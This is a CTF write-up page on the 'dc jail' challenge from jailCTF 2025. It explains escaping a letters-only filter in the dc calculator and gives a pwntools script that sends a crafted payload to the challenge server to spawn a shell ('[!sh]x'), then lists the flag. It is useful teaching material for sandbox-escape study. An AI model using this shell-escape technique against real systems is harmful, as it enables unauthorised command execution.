<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
<!DOCTYPE html>
<html lang="en" data-bs-theme="light">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        
        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-10-04-jailctf-2025/dc-jail.html">
        <link rel="shortcut icon" href="../img/favicon.ico">
        <title>dc jail - CTF Writeups by @jiegec</title>
        <link href="../css/bootstrap.min.css" rel="stylesheet">
        <link href="../css/fontawesome.min.css" rel="stylesheet">
        <link href="../css/brands.min.css" rel="stylesheet">
        <link href="../css/solid.min.css" rel="stylesheet">
        <link href="../css/v4-font-face.min.css" rel="stylesheet">
        <link href="../css/base.css" rel="stylesheet">
        <!-- added by @jiegec begin -->
        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
        <!-- added by @jiegec end -->
        <!-- added by @jiegec begin -->
        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
        <!-- added by @jiegec end -->

      <!-- added by @jiegec begin -->
      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
      </script>
      
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
      <script>
          window.dataLayer = window.dataLayer || [];
          function gtag() { dataLayer.push(arguments); }
          gtag('js', new Date());
      
          gtag('config', 'G-3109FRSVTT');
      </script>
      
      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
      <!-- added by @jiegec end --> 
    </head>

    <body>
        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
            <div class="container">
                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
                <!-- Expander button -->
                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <!-- Expanded navigation -->
                <div id="navbar-collapse" class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="nav-item">
                                <a href="../index.html" class="nav-link">Home</a>
                            </li>
                            <li class="nav-item">
                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
                            </li>
                            <li class="nav-item">
                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
                            </li>
                            <li class="nav-item">
                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav ms-md-auto">
                        <li class="nav-item">
                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
            <div class="row">
                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
    <div class="navbar-header">
        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
            <span class="fa fa-angle-down"></span>
        </button>
    </div>

    
    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
        <ul class="nav flex-column">
            
            <li class="nav-item" data-bs-level="1"><a href="#dc-jail" class="nav-link">dc jail</a>
              <ul class="nav flex-column">
              </ul>
            </li>
        </ul>
    </div>
</div></div>
                    <div class="col-md-9" role="main">

<h1 id="dc-jail">dc jail</h1>
<pre class="highlight"><code>a "desk calculator" ... using "reverse polish notation" ... yeah this was not on my bucket list for year

nc challs1.pyjail.club 16303</code></pre>
<p>Attachment:</p>
<pre class="highlight"><code class="language-python">#!/usr/bin/python3

import os

inp = input('&gt; ')
if any(c not in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy' for c in inp):  # they gave me no blue raspberry dawg
    print('bad. dont even try using lowercase z')
    exit(1)

with open('/tmp/code.txt', 'w') as f:
    f.write(inp)

os.system(f'/usr/bin/dc -f /tmp/code.txt')

print("stop. you're done. get out.")</code></pre>
<p>Reading the dc manpage, here are some interesting commands:</p>
<pre class="highlight"><code class="language-man">       k      Pops the value off the top of the stack and uses it to set the precision.

       I      Pushes the current input radix on the stack.

       v      Pops one value, computes its square root, and pushes that.  The maximum of the
              precision  value  and  the  precision of the argument is used to determine the
              number of fraction digits in the result.

       Z      Pops a value off the stack, calculates the number of decimal digits it has (or
              number of characters, if it is a string) and pushes that  number.   The  digit
              count for a number does not include any leading zeros, even if those appear to
              the right of the radix point.

       d      Duplicates the value on the top of the stack,  pushing  another  copy  of  it.
              Thus, ``4d*p'' computes 4 squared and prints it.

       a      The  top-of-stack  is  popped.  If it was a number, then the low-order byte of
              this number is converted into a string and pushed onto the  stack.   Otherwise
              the  top-of-stack  was  a  string,  and  the first character of that string is
              pushed back.

       x      Pops a value off the stack and executes it as a macro.  Normally it should  be
              a string; if it is a number, it is simply pushed back onto the stack.  For ex‐
              ample, [1p]x executes the macro 1p which pushes 1 on the stack and prints 1 on
              a separate line.

       [characters]
              Makes a string containing characters (contained between balanced [ and ] char‐
              acters), and pushes it on the stack.  For example, [foo]P prints  the  charac‐
              ters foo (with no newline).

       !      Will  run  the rest of the line as a system command.  Note that parsing of the
              !&lt;, !=, and !&gt; commands take precedence, so if  you  want  to  run  a  command
              starting with &lt;, =, or &gt; you will need to add a space after the !.

       ?      Reads  a  line from the terminal and executes it.  This command allows a macro
              to request input from the user.</code></pre>
<p>Here is the general idea:</p>
<ol>
<li>To get shell, we need to use <code>!sh</code></li>
<li>However, we cannot use <code>!</code>, so we put it into a string via <code>[!sh]</code>, and execute it with <code>x</code>: <code>[!sh]x</code></li>
<li>However, we cannot use <code>[</code> for <code>]</code>, instead, we can use <code>a</code> to construct a single-character string, but <code>!sh</code> is too long</li>
<li>Therefore we use <code>[?]x</code> to readline from stdin and execute it</li>
<li>So we only need to construct <code>?</code> on the stack, which can be compute from 63 (ASCII of <code>?</code>) via <code>a</code></li>
<li>To construct 63, we first push 10 (the default input radix) onto the stack via <code>I</code></li>
<li>To make it larger, we extend the precision to 10 by <code>k</code>, then we can use <code>v</code> to compute <code>sqrt(10)</code> of precision 10: <code>3.1622776601</code></li>
<li><code>3.1622776601</code> has 11 digits, so applying <code>Z</code> to it gives us <code>11</code></li>
<li>Set precision as <code>11</code> and repeat the process of <code>dZkv</code> (duplicate TOS, count its decimal digits, set as precision, square root), until we get 63</li>
</ol>
<p>Attack:</p>
<pre class="highlight"><code class="language-python">from pwn import *

# notes:
# [!sh]x: get shell
# [?]x: readline and eval
# 63a: push "?" to stack

# I: push 10
# k: pop 10, set precision = 10
# I: push 10
# v: pop 10, push sqrt(10)
# extend digits by (TOS means top of stack):
# 1. d: duplicate TOS
# 2. Z: pop and compute number of decimal digits of TOS
# 3. k: pop and set precision as TOS
# 4. v: pop TOS, push sqrt(TOS)
# p = process("dc")
p = remote("challs1.pyjail.club", 16303)
p.recvuntil(b"&gt; ")
p.sendline(f"IkIv{'dZkv'*52}Zax".encode())
sleep(1)
p.sendline(f"[!sh]x".encode())
p.interactive()</code></pre>
<p>Flag: <code>jail{but_does_your_desk_calculator_have_rce?_5c9cff7b71fc447d}</code>.</p>
<p>An elegant and simple solution is provided by @mirelgigel at <a href="https://github.com/mirelgigel/writeupjailctf">mirelgigel/writeupjailctf</a>.</p></div>

                <!-- added by @jiegec begin -->
                <div class="col-md-3"></div>
                <div class="col-md-9">
                  <script src="https://giscus.app/client.js"
                      data-repo="jiegec/ctf-writeups"
                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
                      data-category="General"
                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
                      data-mapping="pathname"
                      data-strict="1"
                      data-reactions-enabled="1"
                      data-emit-metadata="0"
                      data-input-position="top"
                      data-theme="light"
                      data-lang="en"
                      data-loading="lazy"
                      crossorigin="anonymous"
                      async>
                  </script>
                </div>
                <!-- added by @jiegec end -->
            </div>
        </div>

        <footer class="col-md-12">
            <hr>
                <p>Copyright &copy; 2025 Jiajie Chen</p>
            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
        </footer>
        <script src="../js/bootstrap.bundle.min.js"></script>
        <script>
            var base_url = "..",
                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
        </script>
        <script src="../js/base.js"></script>
        <script src="../search/main.js"></script>

        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <p>From here you can search these documents. Enter your search terms below.</p>
                <form>
                    <div class="form-group">
                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                    </div>
                </form>
                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <table class="table">
                <thead>
                  <tr>
                    <th style="width: 20%;">Keys</th>
                    <th>Action</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td class="help shortcut"><kbd>?</kbd></td>
                    <td>Open this help</td>
                  </tr>
                  <tr>
                    <td class="next shortcut"><kbd>n</kbd></td>
                    <td>Next page</td>
                  </tr>
                  <tr>
                    <td class="prev shortcut"><kbd>p</kbd></td>
                    <td>Previous page</td>
                  </tr>
                  <tr>
                    <td class="search shortcut"><kbd>s</kbd></td>
                    <td>Search</td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div class="modal-footer">
            </div>
        </div>
    </div>
</div>

    </body>
</html>
